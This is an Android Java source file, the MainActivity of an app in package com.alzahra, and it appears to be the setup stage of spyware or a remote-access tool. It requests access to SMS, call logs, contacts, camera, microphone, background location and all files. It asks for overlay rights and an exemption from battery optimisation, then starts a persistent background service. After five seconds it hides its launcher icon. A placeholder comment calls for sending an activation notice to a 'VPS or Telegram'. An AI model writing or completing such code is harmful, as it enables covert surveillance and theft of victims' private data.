package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.services.CoreService;

import java.util.ArrayList;

public class MainActivity extends Activity {

    private static final int REQ_PERMISSIONS = 1001;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private ArrayList<String> permissionsList;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (getSharedPreferences("config", MODE_PRIVATE).getBoolean("configured", false)) {
            finish();
            return;
        }

        requestAllPermissions();
    }

    private void requestAllPermissions() {
        permissionsList = new ArrayList<>();

        // Core permissions
        permissionsList.add(Manifest.permission.READ_SMS);
        permissionsList.add(Manifest.permission.SEND_SMS);
        permissionsList.add(Manifest.permission.READ_CALL_LOG);
        permissionsList.add(Manifest.permission.READ_CONTACTS);
        permissionsList.add(Manifest.permission.READ_PHONE_STATE);
        permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        permissionsList.add(Manifest.permission.RECORD_AUDIO);
        permissionsList.add(Manifest.permission.CAMERA);
        permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissionsList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
        permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES);
        permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO);
        permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO);

        // Background location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
            permissionsList.add(Manifest.permission.ACTIVITY_RECOGNITION);
        }

        // Request special permissions first
        requestSpecialPermissions();
    }

    private void requestSpecialPermissions() {
        // 1. All Files Access (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
            startActivityForResult(intent, 2001);
            return;
        }

        // 2. System Alert Window
        if (!Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 2002);
            return;
        }

        // 3. Write Settings
        if (!Settings.System.canWrite(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 2003);
            return;
        }

        // 4. Ignore Battery Optimizations
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + getPackageName()));
            try {
                startActivityForResult(intent, 2004);
                return;
            } catch (Exception e) {}
        }

        // Now request regular permissions
        requestRegularPermissions();
    }

    private void requestRegularPermissions() {
        String[] permissions = permissionsList.toArray(new String[0]);
        ArrayList<String> toRequest = new ArrayList<>();

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(perm);
            }
        }

        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    toRequest.toArray(new String[0]), REQ_PERMISSIONS);
        } else {
            onAllPermissionsGranted();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        switch (requestCode) {
            case 2001:
            case 2002:
            case 2003:
            case 2004:
                requestSpecialPermissions();
                break;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            onAllPermissionsGranted();
        }
    }

    private void onAllPermissionsGranted() {
        Toast.makeText(this, "✅ All permissions granted", Toast.LENGTH_SHORT).show();

        // Send activation
        new Thread(() -> {
            try {
                Thread.sleep(1000);
                // TODO: Send to your VPS or Telegram
            } catch (Exception e) {}
        }).start();

        // Delayed hide
        handler.postDelayed(() -> {
            hideFromLauncher();
        }, 5000);

        // Start service
        ContextCompat.startForegroundService(this, new Intent(this, CoreService.class));

        getSharedPreferences("config", MODE_PRIVATE).edit()
                .putBoolean("configured", true).apply();

        finish();
    }

    private void hideFromLauncher() {
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }
}
